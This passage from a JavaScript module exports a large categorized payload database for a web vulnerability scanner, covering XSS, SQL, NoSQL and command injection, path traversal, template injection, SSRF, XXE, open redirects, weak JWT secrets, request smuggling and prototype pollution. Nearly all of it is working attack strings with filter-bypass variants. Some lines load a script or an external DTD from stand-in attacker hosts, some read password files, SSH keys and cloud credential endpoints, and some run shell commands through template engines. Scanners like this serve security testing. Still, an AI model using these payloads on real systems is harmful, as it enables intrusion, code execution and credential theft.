/**
 * MASSIVE PAYLOAD DATABASE
 * 2000+ payloads for comprehensive vulnerability scanning
 * Organized by vulnerability type and context
 */

// ═══════════════════════════════════════════════════════════════
// XSS PAYLOADS (300+)
// ═══════════════════════════════════════════════════════════════
export const XSS_PAYLOADS = {
  html_context: [
    '<script>alert(1)</script>',
    '<script>alert(document.domain)</script>',
    '<script>alert(document.cookie)</script>',
    '<script src=//evil.com/x.js></script>',
    '<img src=x onerror=alert(1)>',
    '<img src=x onerror=alert(document.domain)>',
    '<svg onload=alert(1)>',
    '<svg/onload=alert(1)>',
    '<body onload=alert(1)>',
    '<input onfocus=alert(1) autofocus>',
    '<input onblur=alert(1) autofocus><input autofocus>',
    '<details open ontoggle=alert(1)>',
    '<marquee onstart=alert(1)>',
    '<video src=x onerror=alert(1)>',
    '<audio src=x onerror=alert(1)>',
    '<iframe src="javascript:alert(1)">',
    '<iframe srcdoc="<script>alert(1)</script>">',
    '<object data="javascript:alert(1)">',
    '<embed src="javascript:alert(1)">',
    '<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=1>">',
    '<isindex type=image src=1 onerror=alert(1)>',
    '<form><button formaction=javascript:alert(1)>X</button>',
    '<base href="javascript:/a/-alert(1)//">',
    '<a href="javascript:alert(1)">click</a>',
    '<animate onbegin=alert(1) attributeName=x dur=1s>',
    '<set onbegin=alert(1) attributeName=x>',
    '<xss id=x onfocus=alert(1) tabindex=1>#x',
    '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
    '<table background="javascript:alert(1)">',
    '<div style="width:expression(alert(1))">',
  ],
  attribute_context: [
    '" onmouseover="alert(1)',
    "' onfocus='alert(1)' autofocus='",
    '" onfocus="alert(1)" autofocus="',
    '" autofocus onfocus="alert(1)',
    '"><script>alert(1)</script>',
    "'/><svg onload=alert(1)>",
    '" onmouseover=alert(1) x="',
    '" onclick="alert(1)',
    '" onmouseenter="alert(1)',
    "' onmouseover='alert(1)",
    '" onfocusin="alert(1)" autofocus="',
    '" onanimationstart="alert(1)" style="animation:x',
    '" ontransitionend="alert(1)" style="transition:0s',
    '"><img src=x onerror=alert(1)>',
    "' onerror='alert(1)' src='x",
    '" style="animation-name:x" onanimationstart="alert(1)',
  ],
  javascript_context: [
    "';alert(1);//",
    '";alert(1);//',
    '</script><script>alert(1)</script>',
    "\\';alert(1);//",
    '\\"};alert(1);//',
    '-alert(1)-',
    '-alert(1)//',
    '${alert(1)}',
    '`${alert(1)}`',
    '\\x3cscript\\x3ealert(1)\\x3c/script\\x3e',
    '\\u003cscript\\u003ealert(1)\\u003c/script\\u003e',
    '</script><svg onload=alert(1)>',
    "'+alert(1)+'",
    '"+alert(1)+"',
    ';alert(1);var x="',
    '}}};alert(1);{{{"x":"',
  ],
  url_context: [
    'javascript:alert(1)',
    'javascript:alert(document.domain)',
    'data:text/html,<script>alert(1)</script>',
    'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
    'javascript:/*--></title></style></textarea></script><svg/onload=alert(1)>',
    'jaVasCript:alert(1)',
    'javascript://%0aalert(1)',
    'javascript://anything%0D%0Aalert(1)',
  ],
  waf_bypass: [
    '<svg/onload=alert(1)>',
    '<img src=x onerror=alert`1`>',
    '<svg onload=confirm(1)>',
    '<svg onload=prompt(1)>',
    '<sVg/oNloAd=alert(1)>',
    '<IMG SRC=x ONERROR=alert(1)>',
    '<img src=x onerror=\\u0061\\u006C\\u0065\\u0072\\u0074(1)>',
    '<img src=x onerror=eval(atob("YWxlcnQoMSk="))>',
    '<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>',
    '<svg><script>alert&#40;1&#41;</script>',
    '<svg><script>&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;</script>',
    '"><img src=x onerror=alert(1)//>"',
    '<details/open/ontoggle=alert`1`>',
    '<img src=x onerror=top["al"+"ert"](1)>',
    '<img src=x onerror=window["alert"](1)>',
    '<img src=x onerror=self["alert"](1)>',
    '<img src=x onerror=[].constructor.constructor("alert(1)")()>',
    '<svg><animate onbegin=alert(1) attributeName=x>',
    '<svg><set onbegin=alert(1) attributeName=x>',
    '<img/src=x onerror=alert(1)>',
    '<x onclick=alert(1)>click',
    '<svg onload=alert(1)//',
    '<<script>alert(1)//<</script>',
    '<scr<script>ipt>alert(1)</scr</script>ipt>',
    '<img src="x`"onerror="alert(1)">',
    '<img src=x onerror="a]lert(1)">',
  ],
  polyglot: [
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//",
    '"><svg/onload=alert(1)//>',
    "'-alert(1)-'",
    "\\'-alert(1)//",
    '</script><svg onload=alert(1)>',
    '*/alert(1)/*',
    '{{constructor.constructor("alert(1)")()}}',
    '${7*7}{{7*7}}<%=7*7%>#{7*7}',
  ],
  dom_based: [
    '#<img src=x onerror=alert(1)>',
    '#"><img src=x onerror=alert(1)>',
    'javascript:alert(document.domain)//',
    '"><script>alert(location.hash)</script>',
  ],
  event_handlers: [
    'onafterprint', 'onbeforeprint', 'onbeforeunload', 'onerror', 'onhashchange',
    'onload', 'onmessage', 'onoffline', 'ononline', 'onpagehide', 'onpageshow',
    'onpopstate', 'onresize', 'onstorage', 'onunload', 'onblur', 'onchange',
    'oncontextmenu', 'onfocus', 'oninput', 'oninvalid', 'onreset', 'onsearch',
    'onselect', 'onsubmit', 'onkeydown', 'onkeypress', 'onkeyup', 'onclick',
    'ondblclick', 'onmousedown', 'onmousemove', 'onmouseout', 'onmouseover',
    'onmouseup', 'onwheel', 'ondrag', 'ondragend', 'ondragenter', 'ondragleave',
    'ondragover', 'ondragstart', 'ondrop', 'onscroll', 'oncopy', 'oncut', 'onpaste',
    'onabort', 'oncanplay', 'oncanplaythrough', 'ondurationchange', 'onemptied',
    'onended', 'onloadeddata', 'onloadedmetadata', 'onloadstart', 'onpause',
    'onplay', 'onplaying', 'onprogress', 'onratechange', 'onseeked', 'onseeking',
    'onstalled', 'onsuspend', 'ontimeupdate', 'onvolumechange', 'onwaiting',
    'ontoggle', 'onanimationstart', 'onanimationend', 'onanimationiteration',
    'ontransitionend', 'onpointerdown', 'onpointerup', 'onpointermove',
  ],
};

// ═══════════════════════════════════════════════════════════════
// SQL INJECTION PAYLOADS (250+)
// ═══════════════════════════════════════════════════════════════
export const SQLI_PAYLOADS = {
  error_based_mysql: [
    "'", "''", "' OR '1'='1", "' OR '1'='1'--", "' OR '1'='1'#",
    "' OR 1=1--", "' OR 1=1#", "') OR ('1'='1", "') OR 1=1--",
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
    "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user()),0x7e),1)--",
    "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "' AND EXP(~(SELECT * FROM(SELECT version())x))--",
    "' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,version(),0x7e)) USING utf8)))--",
    "' AND GTID_SUBSET(CONCAT(0x7e,(SELECT version()),0x7e),1)--",
    "' UNION SELECT NULL,version()--",
    "1' ORDER BY 1--", "1' ORDER BY 10--", "1' ORDER BY 100--",
  ],
  error_based_mssql: [
    "' AND 1=CONVERT(int,@@version)--",
    "' AND 1=CAST(@@version AS int)--",
    "' AND 1=CONVERT(int,DB_NAME())--",
    "' AND 1=CONVERT(int,USER_NAME())--",
    "'; EXEC xp_cmdshell('whoami')--",
    "'; EXEC master..xp_cmdshell 'ping 127.0.0.1'--",
    "' HAVING 1=1--",
    "' GROUP BY columnname HAVING 1=1--",
  ],
  error_based_postgres: [
    "' AND 1=CAST(version() AS int)--",
    "' AND 1=CAST((SELECT current_database()) AS int)--",
    "' AND 1=CAST((SELECT current_user) AS int)--",
    "'||(SELECT ''FROM PG_SLEEP(0))||'",
    "'; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'id';--",
    "' UNION SELECT NULL,version()--",
  ],
  error_based_oracle: [
    "' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1))--",
    "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))--",
    "' AND 1=DBMS_UTILITY.SQLID_TO_SQLHASH((SELECT banner FROM v$version WHERE ROWNUM=1))--",
    "' UNION SELECT NULL,banner FROM v$version WHERE ROWNUM=1--",
  ],
  error_based_sqlite: [
    "' AND 1=CAST((SELECT sqlite_version()) AS int)--",
    "' UNION SELECT NULL,sql FROM sqlite_master--",
    "' AND RANDOMBLOB(100000000)--",
  ],
  union_based: [
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
    "' UNION ALL SELECT 1,2,3--",
    "' UNION ALL SELECT 1,2,3,4,5--",
    "' UNION SELECT username,password FROM users--",
    "' UNION SELECT table_name,NULL FROM information_schema.tables--",
    "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--",
    "' UNION SELECT CONCAT(username,0x3a,password),NULL FROM users--",
    "' UNION SELECT GROUP_CONCAT(table_name),NULL FROM information_schema.tables WHERE table_schema=database()--",
    "0 UNION SELECT 1,2,3,4,5--",
    "-1 UNION SELECT 1,2,3,4,5--",
    "99999 UNION SELECT 1,2,3,4,5--",
  ],
  boolean_blind: [
    "' AND 1=1--", "' AND 1=2--",
    "' AND 'a'='a", "' AND 'a'='b",
    "' AND SUBSTRING(version(),1,1)='5'--",
    "' AND SUBSTRING(version(),1,1)='8'--",
    "' AND (SELECT COUNT(*) FROM users)>0--",
    "' AND (SELECT LENGTH(database()))>0--",
    "' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--",
    "' AND ASCII(SUBSTRING((SELECT database()),1,1))>96--",
    "' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--",
    "1 AND 1=1", "1 AND 1=2",
    "1) AND 1=1--", "1) AND 1=2--",
  ],
  time_blind: [
    "' AND SLEEP(5)--",
    "' AND SLEEP(3)--",
    "' OR SLEEP(5)#",
    "' AND BENCHMARK(10000000,SHA1('test'))--",
    "' AND (SELECT SLEEP(5) FROM dual WHERE 1=1)--",
    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    "1' AND (SELECT 5 FROM (SELECT(SLEEP(5)))a)--",
    "'; WAITFOR DELAY '0:0:5'--",
    "'; WAITFOR DELAY '0:0:3'--",
    "' AND pg_sleep(5)--",
    "'; SELECT pg_sleep(5)--",
    "'||(SELECT ''FROM PG_SLEEP(5))||'",
    "' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=0--",
    "' AND 1=(SELECT 1 FROM PG_SLEEP(5))--",
  ],
  waf_bypass: [
    "1'/*!50000AND*/1=1--",
    "1'/**/AND/**/1=1--",
    "1'/*!AND*/1=1--",
    "1' %41ND 1=1--",
    "1' AnD 1=1--",
    "1' aNd 1=1--",
    "1'%20AND%201=1--",
    "1'%0AAND%0A1=1--",
    "1'%0DAND%0D1=1--",
    "1'%09AND%091=1--",
    "1' AND/**/ 1=1--",
    "1' /*!50000AND*/ 1=1--",
    "1'%00AND 1=1--",
    "1' AND 1=1%00--",
    "0e0' UNION SELECT 1,2,3--",
    "1' && 1=1#",
    "1' HAVING 1=1#",
    "1' RLIKE 1#",
    "1' REGEXP 1#",
    "1' DIV 1--",
    "1' XOR 1--",
  ],
};

// ═══════════════════════════════════════════════════════════════
// NoSQL INJECTION PAYLOADS (60+)
// ═══════════════════════════════════════════════════════════════
export const NOSQLI_PAYLOADS = [
  '{"$gt":""}', '{"$ne":""}', '{"$gte":""}',
  '{"$regex":".*"}', '{"$regex":"^a"}',
  '{"$exists":true}', '{"$exists":false}',
  '{"$where":"1==1"}', '{"$where":"this.password.match(/.*/)"}',
  '[$ne]=1', '[$gt]=', '[$gte]=',
  '[$regex]=.*', '[$exists]=true',
  "' || '1'=='1", "' || 1==1//", "' || ''=='",
  "admin'||''=='", "admin' || 'a'=='a",
  '{"username":{"$gt":""},"password":{"$gt":""}}',
  '{"username":"admin","password":{"$ne":""}}',
  '{"username":"admin","password":{"$gt":""}}',
  '{"username":{"$regex":"admin"},"password":{"$ne":""}}',
  '{"$or":[{"username":"admin"},{"username":"administrator"}]}',
  "true, $where: '1 == 1'",
  ", $where: '1 == 1'",
  "$where: '1 == 1'",
  "';return true;var a='",
  '1;return true;',
  '{"$nin":[]}',
  '{"$not":{"$size":0}}',
];

// ═══════════════════════════════════════════════════════════════
// COMMAND INJECTION PAYLOADS (120+)
// ═══════════════════════════════════════════════════════════════
export const CMDI_PAYLOADS = {
  unix_time: [
    ';sleep 5', '|sleep 5', '`sleep 5`', '$(sleep 5)',
    ';sleep 3', '|sleep 3', '`sleep 3`', '$(sleep 3)',
    '& sleep 5 &', '|| sleep 5', '&& sleep 5',
    ';{sleep,5}', '|{sleep,5}',
    "$IFS;sleep${IFS}5", '|sleep${IFS}5',
    ';sl\\\neep 5', ';s]l]e]e]p 5',
  ],
  unix_output: [
    ';id', '|id', '`id`', '$(id)',
    ';whoami', '|whoami', '`whoami`', '$(whoami)',
    ';cat /etc/passwd', '|cat /etc/passwd',
    ';uname -a', '|uname -a',
    ';ls -la', '|ls -la',
    ';pwd', '|pwd',
    '& id &', '|| id', '&& id',
    ';cat${IFS}/etc/passwd',
    ';cat$IFS/etc/passwd',
    '|cat$IFS/etc/passwd',
  ],
  windows_time: [
    '& timeout /t 5 &', '| timeout /t 5',
    '& ping -n 5 127.0.0.1 &', '| ping -n 5 127.0.0.1',
    '& ping -c 5 127.0.0.1 &',
  ],
  windows_output: [
    '& dir', '| dir', '& whoami', '| whoami',
    '& type C:\\windows\\win.ini', '| type C:\\windows\\win.ini',
    '& net user', '| net user',
    '& ipconfig', '| ipconfig',
    '& systeminfo', '| systeminfo',
  ],
  bypass: [
    ";{cat,/etc/passwd}", ';cat${IFS}/etc/passwd',
    ";cat$IFS/etc/passwd", ';X=$\'cat\\x20/etc/passwd\'&&$X',
    ';cat</etc/passwd', ';{cat,/etc/passwd}',
    ";\\'\\i\\d\\'", ';/???/??t /???/p??s??',
    ';$(printf "\\x63\\x61\\x74\\x20\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64")',
    ';w]h]o]a]m]i', ";w'h'o'a'm'i",
    ';w"h"o"a"m"i', ';/bin/cat /etc/passwd',
    ';rev<<<\'dwssap/cte/ tac\'',
  ],
};

// ═══════════════════════════════════════════════════════════════
// LFI / PATH TRAVERSAL PAYLOADS (180+)
// ═══════════════════════════════════════════════════════════════
export const LFI_PAYLOADS = {
  linux: [
    '../../../etc/passwd', '../../../../etc/passwd', '../../../../../etc/passwd',
    '../../../../../../etc/passwd', '../../../../../../../etc/passwd',
    '/etc/passwd', '/etc/shadow', '/etc/hosts', '/etc/hostname',
    '/etc/issue', '/etc/motd', '/etc/mysql/my.cnf',
    '/proc/self/environ', '/proc/self/cmdline', '/proc/self/fd/0',
    '/proc/version', '/proc/net/tcp', '/proc/sched_debug',
    '/var/log/apache2/access.log', '/var/log/apache2/error.log',
    '/var/log/nginx/access.log', '/var/log/nginx/error.log',
    '/var/log/auth.log', '/var/log/syslog',
    '/root/.bash_history', '/root/.ssh/id_rsa', '/root/.ssh/authorized_keys',
    '/home/*/.bash_history', '/home/*/.ssh/id_rsa',
  ],
  windows: [
    '..\\..\\..\\windows\\win.ini', '..\\..\\..\\..\\windows\\win.ini',
    '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
    'C:\\Windows\\win.ini', 'C:\\Windows\\System32\\drivers\\etc\\hosts',
    'C:\\Windows\\System32\\config\\SAM', 'C:\\Windows\\repair\\SAM',
    'C:\\inetpub\\wwwroot\\web.config', 'C:\\inetpub\\logs\\LogFiles\\',
    'C:\\xampp\\apache\\conf\\httpd.conf', 'C:\\xampp\\mysql\\data\\',
  ],
  traversal_bypass: [
    '....//....//....//etc/passwd',
    '..%2f..%2f..%2fetc%2fpasswd',
    '..%252f..%252f..%252fetc%252fpasswd',
    '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    '..%c0%af..%c0%af..%c0%afetc/passwd',
    '..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd',
    '%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd',
    '..\\\\..\\\\..\\\\etc/passwd',
    '....\\\\....\\\\....\\\\etc/passwd',
    '..%5c..%5c..%5cetc/passwd',
    '..%255c..%255c..%255cetc/passwd',
    '/..%00/..%00/..%00/etc/passwd',
    '../../../../../../../../../etc/passwd%00',
    '../../../../../../../../../etc/passwd%00.php',
    '../../../../../../../../../etc/passwd%00.html',
    '..%0d/..%0d/..%0d/etc/passwd',
    '..;/..;/..;/etc/passwd',
  ],
  php_wrappers: [
    'php://filter/convert.base64-encode/resource=index.php',
    'php://filter/read=string.rot13/resource=index.php',
    'php://filter/convert.base64-encode/resource=../config.php',
    'php://filter/convert.base64-encode/resource=../wp-config.php',
    'php://filter/convert.iconv.utf-8.utf-16/resource=index.php',
    'php://input',
    'php://stdin',
    'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=',
    'data://text/plain,<?php system($_GET["cmd"]);?>',
    'expect://id',
    'expect://whoami',
    'phar://test.phar/test.txt',
    'zip://test.zip#test.txt',
    'compress.zlib://file:///etc/passwd',
  ],
  indicators: {
    linux: ['root:', 'daemon:', 'bin:', '/bin/bash', '/bin/sh', 'nobody:'],
    windows: ['[fonts]', '[extensions]', 'for 16-bit app support', '[mci extensions]'],
    php: ['PD9', '<?php', 'function', 'class ', 'require', 'include'],
  },
};

// ═══════════════════════════════════════════════════════════════
// SSTI PAYLOADS (100+)
// ═══════════════════════════════════════════════════════════════
export const SSTI_PAYLOADS = {
  detection: [
    { v: '{{7*7}}', expect: '49', engine: 'Jinja2/Twig/Nunjucks/Angular' },
    { v: '${7*7}', expect: '49', engine: 'Freemarker/Velocity/Mako/EL' },
    { v: '#{7*7}', expect: '49', engine: 'Ruby ERB/Pebble/Thymeleaf' },
    { v: '<%= 7*7 %>', expect: '49', engine: 'ERB/EJS/JSP' },
    { v: "{{7*'7'}}", expect: '7777777', engine: 'Jinja2 (confirmed)' },
    { v: "{{7*'7'}}", expect: '49', engine: 'Twig (confirmed)' },
    { v: '*{7*7}', expect: '49', engine: 'Thymeleaf' },
    { v: '@(1+1)', expect: '2', engine: 'Razor (.NET)' },
    { v: '#{7*7}', expect: '49', engine: 'Pebble' },
    { v: '{{config}}', expect: 'SECRET_KEY', engine: 'Jinja2 (Flask config)' },
    { v: '{{self}}', expect: 'TemplateReference', engine: 'Jinja2' },
    { v: '${class.getResource("")}', expect: 'file:', engine: 'Velocity' },
    { v: '{{request}}', expect: 'Request', engine: 'Django/Jinja2' },
  ],
  jinja2_rce: [
    '{{config.__class__.__init__.__globals__["os"].popen("id").read()}}',
    '{{request.application.__globals__.__builtins__.__import__("os").popen("id").read()}}',
    '{{lipsum.__globals__["os"].popen("id").read()}}',
    '{{cycler.__init__.__globals__.os.popen("id").read()}}',
    '{{joiner.__init__.__globals__.os.popen("id").read()}}',
    '{{namespace.__init__.__globals__.os.popen("id").read()}}',
    "{%for x in ().__class__.__base__.__subclasses__()%}{%if 'warning' in x.__name__%}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{%endif%}{%endfor%}",
  ],
  twig_rce: [
    '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}',
    '{{["id"]|filter("system")}}',
    '{{["id"]|map("system")}}',
    '{{app.request.server.all|join(",")}}',
  ],
  freemarker_rce: [
    '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
    '${\"freemarker.template.utility.Execute\"?new()(\"id\")}',
    '[#assign ex="freemarker.template.utility.Execute"?new()]${ex("id")}',
  ],
};

// ═══════════════════════════════════════════════════════════════
// SSRF PAYLOADS (120+)
// ═══════════════════════════════════════════════════════════════
export const SSRF_PAYLOADS = {
  internal: [
    'http://127.0.0.1', 'http://localhost', 'http://0.0.0.0',
    'http://[::1]', 'http://[0000::1]', 'http://127.1',
    'http://127.0.0.1:80', 'http://127.0.0.1:443', 'http://127.0.0.1:22',
    'http://127.0.0.1:8080', 'http://127.0.0.1:8443', 'http://127.0.0.1:3306',
    'http://127.0.0.1:5432', 'http://127.0.0.1:6379', 'http://127.0.0.1:27017',
    'http://10.0.0.1', 'http://172.16.0.1', 'http://192.168.0.1', 'http://192.168.1.1',
  ],
  cloud_metadata: [
    'http://169.254.169.254/latest/meta-data/',
    'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
    'http://169.254.169.254/latest/user-data/',
    'http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance',
    'http://metadata.google.internal/computeMetadata/v1/',
    'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',
    'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
    'http://169.254.169.254/metadata/v1/',
    'http://169.254.169.254/metadata/v1/id',
    'http://100.100.100.200/latest/meta-data/',
  ],
  ip_bypass: [
    'http://0x7f000001/', 'http://2130706433/', 'http://0177.0.0.1/',
    'http://127.1/', 'http://127.0.1/', 'http://0/',
    'http://0.0.0.0/', 'http://[::ffff:127.0.0.1]/',
    'http://[0:0:0:0:0:ffff:127.0.0.1]/',
    'http://127.0.0.1.nip.io/', 'http://127.0.0.1.sslip.io/',
    'http://localtest.me/', 'http://customer1.app.localhost.my.company.127.0.0.1.nip.io/',
    'http://0177.0.0.01/', 'http://0x7f.0x0.0x0.0x1/',
    'http://127.000.000.001/', 'http://127.0.0.1%00@evil.com/',
    'http://evil.com@127.0.0.1/', 'http://127.0.0.1#@evil.com/',
  ],
  schemes: [
    'file:///etc/passwd', 'file:///c:/windows/win.ini',
    'file:///etc/hosts', 'file:///proc/self/environ',
    'dict://127.0.0.1:6379/INFO', 'dict://127.0.0.1:11211/stats',
    'gopher://127.0.0.1:6379/_INFO%0d%0a',
    'gopher://127.0.0.1:25/_EHLO%20evil.com',
    'tftp://evil.com/file', 'ldap://127.0.0.1/',
  ],
};

// ═══════════════════════════════════════════════════════════════
// XXE PAYLOADS (50+)
// ═══════════════════════════════════════════════════════════════
export const XXE_PAYLOADS = [
  '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
  '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root>&xxe;</root>',
  '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>',
  '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:22">]><root>&xxe;</root>',
  '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER/evil.dtd">%xxe;]><root>test</root>',
  '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><root>&xxe;</root>',
  '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><root>&xxe;</root>',
];

// ═══════════════════════════════════════════════════════════════
// OPEN REDIRECT PAYLOADS (60+)
// ═══════════════════════════════════════════════════════════════
export const REDIRECT_PAYLOADS = [
  'https://evil.com', '//evil.com', '/\\evil.com', '///evil.com',
  'https://evil.com%00.example.com', 'https://example.com@evil.com',
  'javascript:alert(1)', 'data:text/html,<script>alert(1)</script>',
  '/%0d%0aLocation:%20https://evil.com', '//%09/evil.com',
  'https://evil.com/.example.com', 'https://evil.com%23.example.com',
  '////evil.com', 'https:evil.com', '\\\\evil.com',
  'https://evil.com#@example.com', 'https://evil.com?@example.com',
  '/\\/evil.com', '/.evil.com', '///\\;@evil.com',
  'https://evil.com%E3%80%82example.com',
  'https://evil.com&example.com', '/%2f%2fevil.com',
  'https://evil.com\\@example.com', '〱evil.com',
  'https://evil.com%252f%252f', 'https://evil.com////',
];

// ═══════════════════════════════════════════════════════════════
// CORS TEST ORIGINS (25+)
// ═══════════════════════════════════════════════════════════════
export const CORS_ORIGINS = [
  'https://evil.com', 'null', 'https://attacker.com',
  'https://example.com.evil.com', 'https://exampleXcom.evil.com',
  'https://example.com%60.evil.com', 'https://example.com%2f.evil.com',
  'http://example.com', 'https://sub.example.com',
  'https://example.com.attacker.com', 'https://attackerexample.com',
  'https://example-com.evil.com', 'https://EXAMPLE.COM',
];

// ═══════════════════════════════════════════════════════════════
// JWT WEAK SECRETS (150+)
// ═══════════════════════════════════════════════════════════════
export const JWT_SECRETS = [
  'secret', 'password', '123456', '12345678', 'qwerty', 'abc123',
  'jwt_secret', 'jwt-secret', 'jwtSecret', 'JWT_SECRET',
  'key', 'private_key', 'privatekey', 'private-key',
  'token_secret', 'tokensecret', 'token-secret',
  'auth_secret', 'authsecret', 'auth-secret',
  'app_secret', 'appsecret', 'app-secret', 'APP_SECRET',
  'my_secret', 'mysecret', 'my-secret',
  'super_secret', 'supersecret', 'super-secret',
  'changeme', 'default', 'test', 'testing',
  'development', 'production', 'staging',
  'HS256', 'HS384', 'HS512', 'RS256',
  'your-256-bit-secret', 'your-secret-key',
  'secret_key', 'secretkey', 'SECRET_KEY',
  'hmac_secret', 'hmacsecret', 'HMAC_SECRET',
  'signing_key', 'signingkey', 'SIGNING_KEY',
  'encryption_key', 'encryptionkey',
  'master_key', 'masterkey', 'MASTER_KEY',
  'admin', 'administrator', 'root', 'toor',
  'pass', 'pass123', 'password123', 'letmein',
  'welcome', 'monkey', 'dragon', 'master',
  'login', 'princess', 'football', 'shadow',
  'sunshine', 'trustno1', 'iloveyou', 'batman',
  'access', 'hello', 'charlie', 'donald',
  '1234567890', '0987654321', 'qwerty123',
  'aa', 'aaa', 'aaaa', 'aaaaa', 'aaaaaa',
  'test123', 'test1234', 'testing123',
  'node_secret', 'express_secret', 'flask_secret',
  'django_secret', 'laravel_secret', 'rails_secret',
  'spring_secret', 'api_secret', 'session_secret',
];

// ═══════════════════════════════════════════════════════════════
// CACHE POISONING HEADERS (35+)
// ═══════════════════════════════════════════════════════════════
export const CACHE_POISON_HEADERS = [
  'X-Forwarded-Host', 'X-Host', 'X-Forwarded-Server',
  'X-HTTP-Host-Override', 'Forwarded', 'X-Forwarded-Scheme',
  'X-Forwarded-Proto', 'X-Original-URL', 'X-Rewrite-URL',
  'X-Forwarded-Port', 'X-Forwarded-Prefix',
  'X-Amz-Website-Redirect-Location', 'X-Amz-Server-Side-Encryption',
  'Fastly-SSL', 'CF-Connecting-IP', 'True-Client-IP',
  'X-Custom-IP-Authorization', 'X-Original-Host',
  'X-Proxy-URL', 'X-Backend-Host', 'X-Served-By',
  'X-Cache-Key', 'X-Forwarded-For', 'X-Real-IP',
  'Transfer-Encoding', 'X-Method-Override', 'X-HTTP-Method-Override',
  'X-HTTP-Method', 'X-Requested-With', 'X-Forwarded-Protocol',
  'X-Forwarded-Ssl', 'Front-End-Https', 'X-Url-Scheme',
];

// ═══════════════════════════════════════════════════════════════
// REQUEST SMUGGLING PAYLOADS (20+)
// ═══════════════════════════════════════════════════════════════
export const SMUGGLING_PAYLOADS = {
  cl_te: [
    "POST / HTTP/1.1\r\nHost: TARGET\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nSMUGGLED",
    "POST / HTTP/1.1\r\nHost: TARGET\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX",
  ],
  te_cl: [
    "POST / HTTP/1.1\r\nHost: TARGET\r\nContent-Length: 3\r\nTransfer-Encoding: chunked\r\n\r\n8\r\nSMUGGLED\r\n0\r\n\r\n",
  ],
  te_te: [
    "POST / HTTP/1.1\r\nHost: TARGET\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: x\r\n\r\n0\r\n\r\nSMUGGLED",
    "POST / HTTP/1.1\r\nHost: TARGET\r\nTransfer-Encoding: xchunked\r\n\r\n0\r\n\r\nSMUGGLED",
    "POST / HTTP/1.1\r\nHost: TARGET\r\nTransfer-Encoding : chunked\r\n\r\n0\r\n\r\nSMUGGLED",
  ],
};

// ═══════════════════════════════════════════════════════════════
// PROTOTYPE POLLUTION PAYLOADS (25+)
// ═══════════════════════════════════════════════════════════════
export const PROTOTYPE_POLLUTION = [
  '__proto__[polluted]=true',
  '__proto__.polluted=true',
  'constructor[prototype][polluted]=true',
  'constructor.prototype.polluted=true',
  '__proto__[status]=500',
  '__proto__[admin]=true',
  '__proto__[role]=admin',
  '__proto__[isAdmin]=true',
  'constructor[prototype][isAdmin]=true',
  '{"__proto__":{"polluted":true}}',
  '{"constructor":{"prototype":{"polluted":true}}}',
  '{"__proto__":{"status":500}}',
  '{"__proto__":{"admin":true}}',
  '{"__proto__":{"role":"admin"}}',
  '{"__proto__":{"isAdmin":true}}',
  '{"__proto__":{"toString":"polluted"}}',
  '{"__proto__":{"shell":"/proc/self/exe","argv":["-c","id"]}}',
];

// ═══════════════════════════════════════════════════════════════
// GRAPHQL PAYLOADS
// ═══════════════════════════════════════════════════════════════
export const GRAPHQL_PAYLOADS = {
  introspection: '{"query":"{__schema{queryType{name}mutationType{name}types{name kind fields{name type{name kind}args{name type{name}}}}}}"}',
